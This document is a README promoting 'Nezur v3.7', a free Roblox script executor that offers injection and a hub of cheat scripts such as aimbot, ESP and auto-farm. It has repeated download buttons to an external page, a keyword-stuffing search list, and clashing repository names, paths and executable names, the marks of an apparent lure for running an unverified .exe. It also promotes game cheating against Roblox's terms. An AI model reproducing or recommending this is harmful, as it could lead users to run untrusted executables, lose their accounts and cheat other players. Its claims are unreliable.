# Nezur PC v3.7 - Roblox Script Executor 2026

> **A compact, Windows-native Lua executor made for Roblox scripting workflows.** It brings instant injection, a hand-picked script hub with 500+ preloaded scripts, and an auto-update system, all wrapped in a minimal desktop UI. Built for Windows 10/11 and available free of charge.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com/OWNER/Nezur-Execut)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com/OWNER/Nezur-Execut)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com/OWNER/Nezur-Execut)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/walkerhenry2002/nezur-win-script-hub-v37?style=flat-square)](https://github.com/OWNER/Nezur-Execut)

---

<p align="center">
  <a href="https://walkerhenry2002.github.io/nezur-win-script-hub-v37/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Nezur-v3.7%20Latest-brightgreen?style=for-the-badge" alt="Download Nezur">
  </a>
</p>

> **[Direct Download - Nezur v3.7](https://walkerhenry2002.github.io/nezur-win-script-hub-v37/)**  
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

[Download Latest Build](https://walkerhenry2002.github.io/nezur-win-script-hub-v37/)

---

## Overview

Nezur is a third-party script executor built specifically for Roblox on Windows. It lets you run custom Lua code inside Roblox games, making it useful for automating tasks, testing game behavior, or extending normal gameplay. The experience is intentionally straightforward: a one-click injection flow, a built-in library of 500+ community scripts, and no required registration or sign-in.

Under the hood, Nezur uses a persistent injection queue so scripts remain prepared even after Roblox updates, while the auto-update engine helps keep the executor aligned with the newest Roblox releases. The interface stays small and light on system resources, so it can run alongside Roblox without adding much overhead. Whether you are new to Lua execution or already familiar with modding tools, Nezur is designed to keep scripting on Windows simple.

---

## Main Capabilities

- **One-Click Injection** - Connect the executor to Roblox with a single action, with no complicated setup steps.
- **Built-In Script Hub** - Browse a curated collection of 500+ Lua scripts for many games, including auto-farms and ESP tools.
- **Persistent Script Queue** - Line up multiple scripts so they can re-inject automatically after Roblox reloads or updates.
- **Auto-Update Engine** - Detects Roblox patches and updates the executor without requiring manual downloads.
- **Multi-Language Interface** - Switch the UI language between English, Spanish, Portuguese, Russian, and more.
- **Ultra-Light Footprint** - Operates quietly in the background with under 30 MB of RAM and no intrusive browser hooks.
- **Custom Script Storage** - Keep your own Lua scripts locally for fast access and reuse.

---

## Supported Games & Scripts

| Game                      | Common Script Categories              |
|---------------------------|---------------------------------------|
| Arsenal                   | AimBot, ESP, Auto‑Fire, Wallhack     |
| Jailbreak                  | Cash Farm, Auto‑Rob, Car Spawn, ESP  |
| Pet Simulator X / 99      | Auto‑Farm, Teleport, Egg Hatch       |
| Blox Fruits               | Auto‑Farm, Fruit Finder, Teleport    |
| Adopt Me!                 | Auto‑Walk, Auto‑Trade, Pet Finder    |
| Doors                     | Auto‑Solve, Walkthrough, Anti‑Search |
| Brookhaven                | Teleport, ESP, Speed Boost           |

> **Script Hub Categories:** AutoFarm, ESP, Teleport, Combat, Utility, Visual, GUI, Miscellaneous.

---

## System Requirements

| Component         | Minimum Requirement                    |
|-------------------|----------------------------------------|
| Operating System  | Windows 10 (64‑bit) or Windows 11     |
| Processor         | Intel/AMD dual‑core, 2 GHz            |
| RAM               | 2 GB (4 GB recommended)               |
| Storage           | 50 MB free space                      |
| .NET Framework    | .NET Runtime 4.8 or newer             |
| Roblox            | Latest version of Roblox for Windows  |

---

## Quick Start

1. **Clone the repository** (or download the release zip):
   ```bash
   git clone https://github.com/walkerhenry2002/nezur-win-script-hub-v37.git
   ```
2. **Go to the executor directory**:
   ```bash
   cd Nezur-Execut/NezurExecutor
   ```
3. **Run the program**:
   ```bash
   NezurExecutor.exe
   ```
   *The first launch needs an internet connection so the auto-update engine can check for updates.*

---

## Script Hub - Popular Searches 2026

- "roblox script executor free no key"
- "Nezur executor 2026"
- "best Lua injector for Roblox"
- "auto-update script hub 500+ scripts"
- "free Roblox ESP executor Windows"
- "Nezur auto-farm scripts"
- "Roblox script hub 2026 download"

---

## Project Layout

```
Nezur/
├── bin/                  # Compiled binaries and injector core
├── config/               # User settings, language files, update URLs
├── scripts/              # Local custom scripts (imported by user)
├── logs/                 # Injection logs and error reports
├── NEZUR.exe             # Main executable
├── updater.exe           # Auto‑update helper process
└── README.md
```

---

## FAQ

**Is Nezur safe to use?**  
Any third-party executor comes with unavoidable risk. Nezur itself is not described as containing malicious code, but using it may still break Roblox's Terms of Service. Only use it on accounts where you accept the outcome.

**Will Nezur keep working after a Roblox update?**  
The auto-update engine usually restores compatibility within a few hours after Roblox updates. If injection does not work, restart Nezur and let it check for updates again.

**How does Nezur compare with paid executors?**  
Nezur includes the core features many users want, such as injection, a script hub, and auto-update, without a purchase. It does not include the more advanced debugging features found in some premium tools, but it still covers about 90% of everyday scripting needs.

**Can I get banned for using Nezur?**  
Roblox can detect injection activity. Using any executor, Nezur included, can lead to account penalties. For testing, alternate accounts are recommended, and the risk should be understood in advance.

**Where are downloaded scripts stored?**  
Scripts loaded from the built-in hub are cached in your user profile. Any custom scripts you save remain in the `scripts/` folder as `.lua` files.

---

## Roadmap - 2026

- [x] **Initial public release** (v3.7) - core injection, script hub, auto-update.
- [ ] **Expanded script categories** - add scripts for newer Roblox experiences.
- [ ] **UI theming engine** - allow users to customize colors, transparency, and layout.
- [ ] **Community hub submission** - let users upload and rate scripts directly.
- [ ] **Performance optimizations** - reduce memory usage and injection latency.

---

## License

This project is licensed under the **GNU General Public License v3.0**. See the [LICENSE](LICENSE) file for full terms.

---

<p align="center">
  <i>Run scripts, expand what is possible - Nezur v3.7 for Roblox.</i>
</p>
